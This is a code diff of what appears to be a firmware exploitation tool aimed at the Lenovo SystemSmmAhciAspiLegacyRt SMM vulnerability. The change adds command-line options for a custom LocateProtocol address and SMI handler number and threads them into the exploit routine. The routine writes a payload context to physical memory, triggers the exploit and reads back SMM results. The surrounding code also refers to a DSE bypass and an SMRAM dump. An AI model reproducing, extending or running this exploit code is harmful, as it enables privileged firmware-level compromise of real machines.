@@ -306,7 +306,7 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
-int exploit(PSMM_HANDLER_CONTEXT context, int target, const char *data_file)
+int exploit(PSMM_HANDLER_CONTEXT context, int target, PUEFI_EXPL_TARGET custom_target, const char *data_file)
 {
     int ret = -1;
     PSMM_HANDLER_CONTEXT c = context;
@@ -362,7 +362,7 @@ int exploit(PSMM_HANDLER_CONTEXT context, int target, const char *data_file)
         if (uefi_expl_phys_mem_write(phys_addr, new_size, (unsigned char *)c))
         {
             // run exploit
-            if (expl_lenovo_SystemSmmAhciAspiLegacyRt(target, smm_handler, (void *)phys_addr))
+            if (expl_lenovo_SystemSmmAhciAspiLegacyRt(target, custom_target, smm_handler, (void *)phys_addr))
             {
                 // read SMM_HANDLER_CONTEXT with data returned by smm_handler()
                 if (uefi_expl_phys_mem_read(phys_addr, new_size, (unsigned char *)c))
@@ -453,13 +453,17 @@ unsigned long long smram_addr(void)
 int _tmain(int argc, _TCHAR* argv[])
 {
     int ret = -1, target = -1;
-    unsigned int length = 0;    
+    unsigned int length = 0;        
     const char *data_file = NULL;
-    bool use_dse_bypass = false, use_test = false, use_smram_dump = false;
+    bool use_dse_bypass = false, use_test = false, use_smram_dump = false, use_custom_target = false;
+    
     SMM_HANDLER_CONTEXT context;
-
     memset(&context, 0, sizeof(context));
     context.op = SMM_HANDLER_OP_NONE;
+
+    UEFI_EXPL_TARGET custom_target;
+    memset(&custom_target, 0, sizeof(custom_target));
+    custom_target.smi_num = -1;
 
     // parse command line options
     for (int i = 1; i < argc; i++)
@@ -537,6 +541,37 @@ int _tmain(int argc, _TCHAR* argv[])
 
             i += 1;
         }
+        else if (!strcmp(argv[i], "--target-addr") && i < argc - 1)
+        {
+            /* 
+                Address of EFI_BOOT_SERVICES.LocateProtocol field that necessary for 
+                SystemSmmAhciAspiLegacyRt vulnerability exploitation.
+            */
+            custom_target.addr = strtoull(argv[i + 1], NULL, 16);
+
+            if (errno != 0)
+            {
+                printf("ERROR: Invalid EFI_BOOT_SERVICES.LocateProtocol address specified\n");
+                return -1;
+            }
+
+            use_custom_target = true;
+            i += 1;
+        }
+        else if (!strcmp(argv[i], "--target-smi") && i < argc - 1)
+        {
+            // SMI handler number for SystemSmmAhciAspiLegacyRt vulnerability exploitation
+            custom_target.smi_num = strtoul(argv[i + 1], NULL, 16);
+
+            if (errno != 0)
+            {
+                printf("ERROR: Invalid SMI handler number specified\n");
+                return -1;
+            }
+
+            use_custom_target = true;
+            i += 1;
+        }
         else if (!strcmp(argv[i], "--target-list"))
         {
             // print available targets and exit
@@ -570,6 +605,12 @@ int _tmain(int argc, _TCHAR* argv[])
             printf("ERROR: Unknown option %s\n", argv[i]);
             return -1;
         }
+    }
+
+    if (use_custom_target && custom_target.addr == 0)
+    {
+        printf("ERROR: --target-addr needs to be specified\n");
+        return -1;
     }
 
     if (use_smram_dump && data_file == NULL)
@@ -655,7 +696,7 @@ int _tmain(int argc, _TCHAR* argv[])
                     }
 
                     // run exploitation
-                    ret = exploit(&context, target, data_file);
+                    ret = exploit(&context, target, use_custom_target ? &custom_target : NULL, data_file);
                 }
                 else
                 {
